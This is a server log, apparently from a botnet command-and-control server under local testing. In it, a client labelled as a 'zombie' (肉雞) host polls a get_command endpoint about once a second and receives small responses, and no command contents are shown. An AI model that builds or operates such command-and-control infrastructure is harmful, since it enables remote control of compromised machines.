2025-06-24 23:38:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:38:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:38:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:38:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:38:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:38:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:39:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:39:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:39:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:39:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:39:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:40:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:40:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
